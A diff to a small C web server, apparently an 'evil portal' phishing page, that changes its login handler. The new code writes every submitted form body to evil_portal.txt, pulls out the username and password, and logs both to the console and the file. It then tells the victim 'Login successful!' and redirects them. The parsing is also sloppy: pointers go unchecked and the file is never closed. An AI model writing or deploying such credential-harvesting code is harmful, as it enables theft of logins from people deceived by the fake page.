@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <signal.h>
 
-#define PORT 80
+#define PORT 8080
 #define BUF_SIZE 4096
 
 void serve_static_file(int client_socket, const char* filename, const char* content_type) {
@@ -50,31 +50,40 @@ void redirect_user(int client_socket) {
     send(client_socket, redirect_response, strlen(redirect_response), 0);
 }
 
-#define UN_LEN 64
-void handle_login(int client_socket, const char* request, const char* client_ip) {
-    char username[UN_LEN], password[UN_LEN];
-    char* body = strstr(request, "\r\n\r\n");
+void handle_login(int client_socket, char* body, const char* client_ip) {
+    char* username = NULL;
+    char* password = NULL;
 
-    printf("%s", body);
+    FILE *file = fopen("evil_portal.txt", "a");
+    if (file == NULL) {
+        printf("Error opening file.\n");
+        return;
+    }
 
-    snprintf(username, UN_LEN, "%s", body);
-    char* token = strtok(username, "&");
-    snprintf(password, UN_LEN, "%s", token );
-    
+    fprintf(file, "%s\n", body);
+
+    username = strstr(body, "username=");
+    username += strlen("username=");
+    char* username_end = strstr(username, "&");
+    *username_end = '\0';
+
+    password = username_end + 1;
+    password += strlen("password=");
+
+    printf("UN: %s, PW: %s\n", username, password);
+    fprintf(file, "\n\nUN: %s, PW: %s\n", username, password);
+
     if (body) {
         body += 4;  // Skip the \r\n\r\n to get to the actual body
-        // sscanf(body, "username=%63s[^&]&password=%63s", username, password);
-        // printf("Received credentials: Username=%s, Password=%s\n", username, password);
-        printf("%s", body);
-
         const char* success_response = 
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: text/html\r\n\r\n"
             "<html><body><h2>Login successful!</h2><p>You will be redirected...</p></body></html>";
         send(client_socket, success_response, strlen(success_response), 0);
-
         redirect_user(client_socket);
     }
+
+    // fclose(file);    
 }
 
 int server_fd = -1;
@@ -140,7 +149,6 @@ int main(int argc, char *argv[]) {
                 serve_html(client_socket, html_file_path);
             }
             else if (strncmp(buffer, "POST /login", 11) == 0) {
-                printf("%s", buffer);
                 handle_login(client_socket, buffer, client_ip);
             }
         }
